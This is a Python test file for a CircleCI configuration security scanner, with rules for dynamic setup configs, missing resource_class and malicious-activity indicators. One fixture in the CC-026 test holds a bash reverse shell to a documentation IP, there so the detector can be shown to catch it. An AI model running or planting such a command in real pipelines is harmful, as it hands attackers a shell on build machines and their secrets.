"""Per-rule tests for CircleCI residual rules:
CC-012 (setup: true enables dynamic config generation),
CC-014 (job missing resource_class declaration),
CC-026 (config contains malicious-activity indicators).

CC-012 catches the dynamic-config code-injection surface that
``setup: true`` opens (PR controls the setup job → injects arbitrary
downstream config). CC-014 documents executor scope on every job.
CC-026 is the threat-indicator catch-all.
"""
from __future__ import annotations

from .conftest import run_check

_PINNED_IMG = "cimg/base@sha256:0000000000000000000000000000000000000000000000000000000000000001"


# ── CC-012 setup: true ──────────────────────────────────────────────


class TestCC012SetupWorkflow:
    def test_fails_when_setup_is_true(self):
        cfg = f"""
        version: 2.1
        setup: true
        jobs:
          generate:
            docker:
              - image: {_PINNED_IMG}
            resource_class: small
            steps:
              - run: ./generate-config.sh
        workflows:
          generate:
            jobs: [generate]
        """
        f = run_check(cfg, "CC-012")
        assert not f.passed

    def test_passes_when_setup_omitted(self):
        cfg = f"""
        version: 2.1
        jobs:
          build:
            docker:
              - image: {_PINNED_IMG}
            resource_class: small
            steps:
              - run: make
        workflows:
          main:
            jobs: [build]
        """
        f = run_check(cfg, "CC-012")
        assert f.passed

    def test_passes_when_setup_explicitly_false(self):
        cfg = f"""
        version: 2.1
        setup: false
        jobs:
          build:
            docker:
              - image: {_PINNED_IMG}
            resource_class: small
            steps:
              - run: make
        """
        f = run_check(cfg, "CC-012")
        assert f.passed


# ── CC-014 resource_class declared ──────────────────────────────────


class TestCC014ResourceClass:
    def test_fails_when_job_omits_resource_class(self):
        cfg = f"""
        version: 2.1
        jobs:
          build:
            docker:
              - image: {_PINNED_IMG}
            steps:
              - run: make
        """
        f = run_check(cfg, "CC-014")
        assert not f.passed

    def test_passes_when_every_job_has_resource_class(self):
        cfg = f"""
        version: 2.1
        jobs:
          build:
            docker:
              - image: {_PINNED_IMG}
            resource_class: small
            steps:
              - run: make
          test:
            docker:
              - image: {_PINNED_IMG}
            resource_class: medium
            steps:
              - run: pytest
        """
        f = run_check(cfg, "CC-014")
        assert f.passed


# ── CC-026 malicious-activity indicators ────────────────────────────


class TestCC026MaliciousActivity:
    def test_fails_on_reverse_shell_pattern(self):
        cfg = f"""
        version: 2.1
        jobs:
          ship:
            docker:
              - image: {_PINNED_IMG}
            resource_class: small
            steps:
              - run: bash -i >& /dev/tcp/198.51.100.7/4444 0>&1
        """
        f = run_check(cfg, "CC-026")
        assert not f.passed

    def test_passes_on_clean_config(self):
        cfg = f"""
        version: 2.1
        jobs:
          build:
            docker:
              - image: {_PINNED_IMG}
            resource_class: small
            steps:
              - run: make
        """
        f = run_check(cfg, "CC-026")
        assert f.passed
